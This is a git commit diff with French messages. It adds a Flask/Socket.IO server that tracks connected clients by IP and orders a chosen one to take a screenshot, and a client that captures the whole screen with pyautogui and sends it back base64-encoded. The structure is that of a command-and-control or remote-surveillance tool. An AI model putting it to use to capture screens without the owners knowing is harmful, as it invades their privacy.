dc0261901e1e523d2cfb0b252fb7a7b622d3adc1
Danette10 <dan.sebag1007@gmail.com>
2024-03-19 14:55:54 +0100

    Add screenshot, clients routes and action to client Add list to save and interact with more one client

--- app.py
+++ app.py
@@ -1,27 +1,60 @@
+import base64
+from flask import Flask, request, jsonify
+from flask_socketio import SocketIO
 import os
-from dotenv import load_dotenv
-from flask_socketio import SocketIO, emit
-from flask import Flask, jsonify, request
-
-BASE_API_URL = '/api/v1'
-
-if os.environ.get('ENV') != 'production':
-    load_dotenv()
 
 app = Flask(__name__)
 socketio = SocketIO(app)
+clients = {}
 
 
-# ROUTES
 @app.route('/api/v1/command', methods=['POST'])
 def handle_command():
-    command_data = request.json
-    socketio.emit('command', command_data)
-    return {'status': 'success'}, 200
+    command_data = request.get_json()
+    command = command_data.get('command')
+    ip = command_data.get('ip')
+
+    if command == 'screenshot':
+        for sid, client_ip in clients.items():
+            if client_ip == ip:
+                socketio.emit('command', {'command': 'screenshot'}, room=sid)
+                break
+            else:
+                return jsonify({'status': 'error', 'message': f'Client {ip} non trouvé.'}), 200
+        return jsonify({'status': 'success', 'message': f'Commande de capture d\'écran envoyée au client {ip}.'}), 200
+
+    else:
+        return jsonify({'status': 'error', 'message': 'Commande non reconnue.'}), 400
+
+
+@app.route('/api/v1/clients', methods=['GET'])
+def get_clients():
+    clients_info = [{'name': f'Client {i + 1}', 'ip': ip} for i, ip in enumerate(clients.values())]
+    return jsonify({'status': 'success', 'clients': clients_info}), 200
+
+
+@socketio.on('connect')
+def handle_connect():
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    clients[request.sid] = client_ip
+    print(f"Nouvelle connexion de {client_ip}. Total des clients : {len(clients)}.")
+
+
+@socketio.on('screenshot_response')
+def handle_screenshot(data):
+    screenshot = data.get('screenshot')
+    screenshot_bytes = base64.b64decode(screenshot)
+    with open('screenshot.png', 'wb') as f:
+        f.write(screenshot_bytes)
+    print("Capture d'écran reçue et enregistrée.")
+
+
+@socketio.on('disconnect')
+def handle_disconnect():
+    clients.pop(request.sid)
+    print(f"Déconnexion. Total des clients : {len(clients)}.")
+    print(f"Clients restants : {clients}")
 
 
 if __name__ == '__main__':
-    if os.environ.get('ENV') == 'production':
-        socketio.run(app, host='0.0.0.0', port=5000)
-    else:
-        socketio.run(app, host='0.0.0.0', port=5000, debug=True)
+    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
--- client/client.py
+++ client/client.py
@@ -1,6 +1,11 @@
+import io
 import socketio
+import pyautogui
+import base64
+import time
+from PIL import Image
 
-sio = socketio.Client(logger=True, engineio_logger=True)
+sio = socketio.Client(reconnection=True, reconnection_attempts=5, reconnection_delay=2)
 
 
 @sio.event
@@ -10,7 +15,7 @@ def connect():
 
 @sio.event
 def connect_error(data):
-    print("La connexion a échoué")
+    print(f"La connexion a échoué : {data}")
 
 
 @sio.event
@@ -20,9 +25,46 @@ def disconnect():
 
 @sio.event
 def command(data):
-    print("Commande reçue:", data)
+    if data.get('command') == 'screenshot':
+        print("Capture d'écran demandée")
+        take_and_send_screenshot()
+    else:
+        print(f"Commande non reconnue: {data}")
+
+
+def resize_image(image, base_width=1300):
+    img = Image.open(image)
+    w_percent = (base_width / float(img.size[0]))
+    h_size = int((float(img.size[1]) * float(w_percent)))
+    img = img.resize((base_width, h_size), Image.Resampling.LANCZOS)
+    img_byte_arr = io.BytesIO()
+    img.save(img_byte_arr, format='PNG')
+    return img_byte_arr
+
+
+def take_and_send_screenshot():
+    try:
+        screenshot = pyautogui.screenshot()
+        screenshot_bytes_io = io.BytesIO()
+        screenshot.save(screenshot_bytes_io, format='PNG')
+        screenshot_bytes_io.seek(0)
+
+        resized_screenshot = resize_image(screenshot_bytes_io)
+        screenshot_encoded = base64.b64encode(resized_screenshot.getvalue()).decode()
+
+        while not sio.connected:
+            print("En attente de connexion pour envoyer la capture d'écran...")
+            time.sleep(1)
+        sio.emit('screenshot_response', {'screenshot': screenshot_encoded})
+        print("Capture d'écran envoyée")
+    except Exception as e:
+        print(f"Erreur lors de la prise ou de l'envoi de la capture d'écran : {e}")
 
 
 if __name__ == '__main__':
-    sio.connect('http://127.0.0.1:5000')
-    sio.wait()
+    try:
+        sio.connect('http://127.0.0.1:5000')
+        sio.wait()
+    except KeyboardInterrupt:
+        print("Arrêt du client sur demande de l'utilisateur.")
+        sio.disconnect()
